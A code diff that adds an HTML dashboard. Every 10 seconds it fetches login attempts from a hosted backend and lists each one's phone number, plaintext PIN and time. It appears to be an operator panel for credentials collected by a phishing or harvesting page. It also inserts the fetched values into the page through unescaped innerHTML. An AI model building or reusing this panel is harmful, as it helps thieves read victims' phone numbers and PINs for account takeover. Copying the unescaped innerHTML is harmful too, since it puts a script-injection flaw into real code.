@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Attempts Dashboard</title>
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: #f0f2f5;
+        margin: 0;
+        padding: 20px;
+    }
+
+    h1 {
+        text-align: center;
+        color: #007cba;
+    }
+
+    .container {
+        max-width: 900px;
+        margin: 0 auto;
+        background: #fff;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        padding: 20px;
+    }
+
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 20px;
+    }
+
+    th, td {
+        padding: 12px;
+        border-bottom: 1px solid #ccc;
+        text-align: left;
+    }
+
+    th {
+        background-color: #007cba;
+        color: #fff;
+    }
+
+    tr.new-attempt {
+        animation: highlight 2s ease;
+    }
+
+    @keyframes highlight {
+        0% { background-color: #d1ffd6; }
+        100% { background-color: transparent; }
+    }
+
+    .status {
+        margin-top: 10px;
+        text-align: right;
+        font-size: 14px;
+        color: #555;
+    }
+</style>
+</head>
+<body>
+
+<h1>Login Attempts Dashboard</h1>
+
+<div class="container">
+    <table id="loginTable">
+        <thead>
+            <tr>
+                <th>Phone Number</th>
+                <th>PIN</th>
+                <th>Time</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Login attempts will appear here -->
+        </tbody>
+    </table>
+    <div class="status" id="status">Last updated: --</div>
+</div>
+
+<script>
+let lastFetched = 0;
+
+async function fetchLoginAttempts() {
+    try {
+        const res = await fetch('https://ecobac.onrender.com/api/auth/logins'); // Hosted backend
+        const logins = await res.json();
+
+        const tbody = document.querySelector('#loginTable tbody');
+        tbody.innerHTML = ''; // clear table first
+
+        logins.forEach(login => {
+            const tr = document.createElement('tr');
+            tr.classList.add('new-attempt');
+            tr.innerHTML = `
+                <td>${login.phone}</td>
+                <td>${login.pin}</td>
+                <td>${new Date(login.time).toLocaleString()}</td>
+            `;
+            tbody.appendChild(tr);
+        });
+
+        lastFetched = Date.now();
+        document.getElementById('status').textContent = "Last updated: " + new Date(lastFetched).toLocaleTimeString();
+
+    } catch (err) {
+        console.error("Error fetching login attempts:", err);
+        document.getElementById('status').textContent = "Error fetching data. Check backend.";
+    }
+}
+
+// Initial fetch
+fetchLoginAttempts();
+
+// Auto-refresh every 10 seconds
+setInterval(fetchLoginAttempts, 10000);
+</script>
+
+
+</body>
+</html>
